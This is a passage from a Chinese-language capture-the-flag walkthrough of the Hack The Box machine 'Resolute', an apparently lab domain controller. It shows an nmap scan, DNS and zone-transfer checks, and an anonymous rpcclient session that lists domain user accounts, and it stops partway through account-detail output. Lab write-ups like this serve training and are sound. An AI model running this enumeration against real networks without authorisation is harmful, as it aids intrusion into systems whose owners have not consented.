

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="World&#39;sEnd">
  <meta name="keywords" content="">
  
    <meta name="description" content="Don’t let your future self hate your present self. 不要让未来的你，讨厌现在的自己。 Hack The Box - Resolute12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Walkthrough - Resolute">
<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Resolute.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="Don’t let your future self hate your present self. 不要让未来的你，讨厌现在的自己。 Hack The Box - Resolute12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423205651911.png">
<meta property="article:published_time" content="2023-08-13T22:39:09.031Z">
<meta property="article:modified_time" content="2023-08-13T20:05:39.410Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Active Directory">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png">
  
  
  
  <title>HTB Walkthrough - Resolute - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Walkthrough - Resolute"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          32k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          267 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Walkthrough - Resolute</h1>
            
            
              <div class="markdown-body">
                
                <p>Don’t let your future self hate your present self.</p>
<p>不要让未来的你，讨厌现在的自己。</p>
<h4 id="Hack-The-Box-Resolute"><a href="#Hack-The-Box-Resolute" class="headerlink" title="Hack The Box - Resolute"></a>Hack The Box - Resolute</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Nmap 7.92 scan initiated Sat Apr 23 17:10:45 2022 as: nmap -sC -sV -T4 -Pn -p- -oA nmap.txt 10.10.10.169</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.48s</span> <span class="hljs-string">latency).</span><br><span class="hljs-attr">Not shown:</span> <span class="hljs-number">65512</span> <span class="hljs-string">closed</span> <span class="hljs-string">tcp</span> <span class="hljs-string">ports</span> <span class="hljs-string">(reset)</span><br><span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span><br><span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2022-04-23 09:32:06Z</span><span class="hljs-string">)</span><br><span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">megabank.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">MEGABANK)</span><br><span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span><br><span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">megabank.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>       <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span><br><span class="hljs-number">47001</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-number">49664</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49665</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49666</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49667</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49671</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49674</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">49675</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49680</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49712</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">50105</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">RESOLUTE;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">2h26m59s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">4h02m30s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">6m59s</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2022-04-23T09:33:06</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-number">2022-04-23T09:16:10</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">3.1.1:</span> <br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">6.3</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">Resolute</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">RESOLUTE\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Domain name:</span> <span class="hljs-string">megabank.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Forest name:</span> <span class="hljs-string">megabank.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">FQDN:</span> <span class="hljs-string">Resolute.megabank.local</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2022-04-23T02:33:02-07:00</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">&lt;blank&gt;</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">required</span><br><br><span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-comment"># Nmap done at Sat Apr 23 17:26:25 2022 -- 1 IP address (1 host up) scanned in 940.01 seconds</span><br></code></pre></td></tr></table></figure>

<h5 id="DNS协议："><a href="#DNS协议：" class="headerlink" title="DNS协议："></a>DNS协议：</h5><p>Nmap为我枚举出了megabank.local，但是按惯例来讲目标应该还存有resolute.local，我可以试试：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ <span class="hljs-keyword">dig </span>@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">169</span> megabank.local       <br><br><span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @10.10.10.169 megabank.local</span><br><span class="hljs-comment">; (1 server found)</span><br><span class="hljs-comment">;; global options: +cmd</span><br><span class="hljs-comment">;; Got answer:</span><br><span class="hljs-comment">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="hljs-comment">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="hljs-comment">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 20763</span><br><span class="hljs-comment">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><br><span class="hljs-comment">;; OPT PSEUDOSECTION:</span><br><span class="hljs-comment">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="hljs-comment">;; QUESTION SECTION:</span><br><span class="hljs-comment">;megabank.local.                        IN      A</span><br><br><span class="hljs-comment">;; ANSWER SECTION:</span><br>megabank.local.         <span class="hljs-number">600</span>     IN      A       <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">169</span><br><br><span class="hljs-comment">;; Query time: 187 msec</span><br><span class="hljs-comment">;; SERVER: 10.10.10.169#53(10.10.10.169) (UDP)</span><br><span class="hljs-comment">;; WHEN: Sat Apr 23 17:31:30 CST 2022</span><br><span class="hljs-comment">;; MSG SIZE  rcvd: 59</span><br></code></pre></td></tr></table></figure>

<p>但是我错了：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ dig @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> resolute.<span class="hljs-keyword">local</span><br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span>-Debian &lt;&lt;&gt;&gt; @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> resolute.<span class="hljs-keyword">local</span><br>; (<span class="hljs-number">1</span> <span class="hljs-keyword">server</span> <span class="hljs-built_in">found</span>)<br>;; <span class="hljs-keyword">global</span> <span class="hljs-keyword">options</span>: +cmd<br>;; <span class="hljs-keyword">connection</span> timed <span class="hljs-keyword">out</span>; <span class="hljs-keyword">no</span> servers could be reached<br></code></pre></td></tr></table></figure>

<p>他并没有该域，看来这次或许会反常一点。我还是会尝试区域传输，尽管它从来没成功过：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ dig axfr @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> megabank.<span class="hljs-keyword">local</span>  <br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span>-Debian &lt;&lt;&gt;&gt; axfr @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> megabank.<span class="hljs-keyword">local</span><br>; (<span class="hljs-number">1</span> <span class="hljs-keyword">server</span> <span class="hljs-built_in">found</span>)<br>;; <span class="hljs-keyword">global</span> <span class="hljs-keyword">options</span>: +cmd<br>; Transfer failed.<br></code></pre></td></tr></table></figure>

<h5 id="RCP端口："><a href="#RCP端口：" class="headerlink" title="RCP端口："></a>RCP端口：</h5><p>RPC端口即使现在我依然觉得它很神秘，哪怕现在我也只知道它能用来做哪些，但我还是无法预估它具体能用来做哪些，做多少。我可以尝试匿名链接：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N <span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span><br>rpcclient <span class="hljs-variable">$&gt;</span> <br></code></pre></td></tr></table></figure>

<p>看起来它允许我匿名访问，那么我可以尝试枚举目标一些信息：</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs inform7">rpcclient $&gt; enumdomusers<br>user:<span class="hljs-comment">[Administrator]</span> rid:<span class="hljs-comment">[0x1f4]</span><br>user:<span class="hljs-comment">[Guest]</span> rid:<span class="hljs-comment">[0x1f5]</span><br>user:<span class="hljs-comment">[krbtgt]</span> rid:<span class="hljs-comment">[0x1f6]</span><br>user:<span class="hljs-comment">[DefaultAccount]</span> rid:<span class="hljs-comment">[0x1f7]</span><br>user:<span class="hljs-comment">[ryan]</span> rid:<span class="hljs-comment">[0x451]</span><br>user:<span class="hljs-comment">[marko]</span> rid:<span class="hljs-comment">[0x457]</span><br>user:<span class="hljs-comment">[sunita]</span> rid:<span class="hljs-comment">[0x19c9]</span><br>user:<span class="hljs-comment">[abigail]</span> rid:<span class="hljs-comment">[0x19ca]</span><br>user:<span class="hljs-comment">[marcus]</span> rid:<span class="hljs-comment">[0x19cb]</span><br>user:<span class="hljs-comment">[sally]</span> rid:<span class="hljs-comment">[0x19cc]</span><br>user:<span class="hljs-comment">[fred]</span> rid:<span class="hljs-comment">[0x19cd]</span><br>user:<span class="hljs-comment">[angela]</span> rid:<span class="hljs-comment">[0x19ce]</span><br>user:<span class="hljs-comment">[felicia]</span> rid:<span class="hljs-comment">[0x19cf]</span><br>user:<span class="hljs-comment">[gustavo]</span> rid:<span class="hljs-comment">[0x19d0]</span><br>user:<span class="hljs-comment">[ulf]</span> rid:<span class="hljs-comment">[0x19d1]</span><br>user:<span class="hljs-comment">[stevie]</span> rid:<span class="hljs-comment">[0x19d2]</span><br>user:<span class="hljs-comment">[claire]</span> rid:<span class="hljs-comment">[0x19d3]</span><br>user:<span class="hljs-comment">[paulo]</span> rid:<span class="hljs-comment">[0x19d4]</span><br>user:<span class="hljs-comment">[steve]</span> rid:<span class="hljs-comment">[0x19d5]</span><br>user:<span class="hljs-comment">[annette]</span> rid:<span class="hljs-comment">[0x19d6]</span><br>user:<span class="hljs-comment">[annika]</span> rid:<span class="hljs-comment">[0x19d7]</span><br>user:<span class="hljs-comment">[per]</span> rid:<span class="hljs-comment">[0x19d8]</span><br>user:<span class="hljs-comment">[claude]</span> rid:<span class="hljs-comment">[0x19d9]</span><br>user:<span class="hljs-comment">[melanie]</span> rid:<span class="hljs-comment">[0x2775]</span><br>user:<span class="hljs-comment">[zach]</span> rid:<span class="hljs-comment">[0x2776]</span><br>user:<span class="hljs-comment">[simon]</span> rid:<span class="hljs-comment">[0x2777]</span><br>user:<span class="hljs-comment">[naoki]</span> rid:<span class="hljs-comment">[0x2778]</span><br></code></pre></td></tr></table></figure>

<p>就这样我获取到了一些用户名，可以用来去枚举kerberos协议用户名，但是如果我想知道用户更多的信息：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rpcclient</span> $&gt; querydispinfo<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b0 RID: <span class="hljs-number">0</span>x19ca acb: <span class="hljs-number">0</span>x00000010 Account: abigail      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xfbc RID: <span class="hljs-number">0</span>x1f4 acb: <span class="hljs-number">0</span>x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b4 RID: <span class="hljs-number">0</span>x19ce acb: <span class="hljs-number">0</span>x00000010 Account: angela       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bc RID: <span 